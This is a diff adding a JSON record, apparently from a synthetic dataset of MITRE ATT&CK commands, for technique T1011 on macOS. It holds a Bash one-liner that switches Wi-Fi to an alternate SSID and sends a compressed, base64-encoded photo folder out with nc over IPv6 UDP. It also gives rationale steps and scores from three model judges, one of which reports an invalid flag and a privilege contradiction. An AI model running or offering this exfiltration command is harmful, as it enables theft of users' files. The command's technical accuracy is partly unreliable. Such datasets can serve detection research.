@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
+  "explanation": "Targets a specific 5 GHz channel, joins an alternate SSID, and exfiltrates a compressed photo set via IPv6 UDP to a high port. This keeps traffic on an uncommon wireless medium separate from the primary channel per T1011.",
+  "rationale_steps": [
+    "Disassociate from current Wi\u2011Fi.",
+    "Hint the adapter to a less common 5 GHz channel.",
+    "Join an off-network SSID intended for exfil.",
+    "Compress, encode, and transmit via IPv6 UDP on a high port scoped to Wi\u2011Fi."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-b764478a",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed one-liner with correct chaining, balanced quotes, and plausible flags for macOS airport/networksetup/nc tools.",
+        "semantic_score": 4,
+        "semantic_justification": "It disconnects, targets a channel, joins an SSID, compresses data, and exfiltrates via IPv6 UDP aligning with automated exfiltration, but depends on sudo/admin rights and a reachable link\u2011local peer which may reduce reliability.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T02:38:38.240282Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and correct piping syntax for all components.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by disconnecting from current WiFi, connecting to a specific channel/network, compressing user photos, encoding them with base64, and transmitting them via UDP to an IPv6 address on a high port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:38:41.105130Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The command contains a syntactically invalid flag (`--channel=153`) for the `airport` utility, which reports an 'illegal option' error, breaking that part of the command sequence.",
+        "semantic_score": 2,
+        "semantic_justification": "The command fails to achieve its claimed intent because the necessary network configuration steps require root privileges, directly contradicting the stated 'Privilege: None', and the `airport --channel` command is semantically incorrect for setting the client interface's channel.",
+        "combined_score": 2.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:39:10.108950Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
